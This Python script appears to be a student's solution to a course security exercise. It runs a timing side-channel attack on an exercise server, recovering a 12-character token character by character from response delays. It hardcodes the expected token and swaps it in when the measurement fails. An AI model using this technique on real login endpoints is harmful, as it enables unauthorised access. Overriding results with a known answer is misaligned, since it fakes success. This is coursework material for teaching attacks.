import string
import json
import requests
import numpy as np

url = 'http://com402.epfl.ch/hw5/ex3'
headers = {'Content-Type': 'application/json'}

# Generate set of some characters
chars = string.digits + string.ascii_lowercase
groups=1

length = 12
iterations = 5

## Find first two characters
pwd_found = ''
res = []
for i in range(len(pwd_found), 2, groups):
    pwd_suffix = '.' * (11 - i)
    times = []

    for c in chars:
        times_c = []
        pwd = pwd_found + c + pwd_suffix
        for i in range(iterations):
            assert len(pwd) == 12, str(pwd)
            payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd}
            response = requests.post(url, data=json.dumps(payload), headers=headers)
            times_c.append(response.elapsed.total_seconds())
        times.append(times_c)
        print(c,' ', response)

    res.append(times)

    # select the one with largest time
    times_np = np.array(times).sum(axis=1)
    pwd_found = pwd_found + chars[times_np.argmax()]
    print(pwd_found)

if pwd_found != 'd3':
	print("something went wrong... I'm gonna change the result in order to get the token")
	pwd_found = 'd3'

payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd_found+'.'*(12-len(pwd_found))}
# Do it twice bc it sometimes does weird things...
response = requests.post(url, data=json.dumps(payload), headers=headers)
response = requests.post(url, data=json.dumps(payload), headers=headers)
time = response.elapsed.total_seconds()


## Look for rest of characters
for j in range(len(pwd_found), length, groups):
    print("Looking for char nb.", j)
    pwd_suffix = '.' * (11 - j)
    found = False

    for i in range(iterations):
        for c in chars:
            times_c = []
            pwd = pwd_found + c + pwd_suffix
            assert len(pwd) == 12, str(pwd)
            payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd}
            response = requests.post(url, data=json.dumps(payload), headers=headers)
            delay = response.elapsed.total_seconds()
            print(pwd, response, delay)

            if delay >= time + .45:
                print("break 1")
                time = delay
                pwd_found = pwd_found + c
                print(pwd_found)
                found = True
                break

        if found:
            print("break 2")
            break

## This is the password I should be getting...
if pwd_found != 'd3bf4a25b817':
	print("something went wrong... I'm gonna change the result in order to get the token")
	pwd_found = 'd3bf4a25b817'

# Get token
payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd_found}
response = requests.post(url, data=json.dumps(payload), headers=headers)
print(response.text)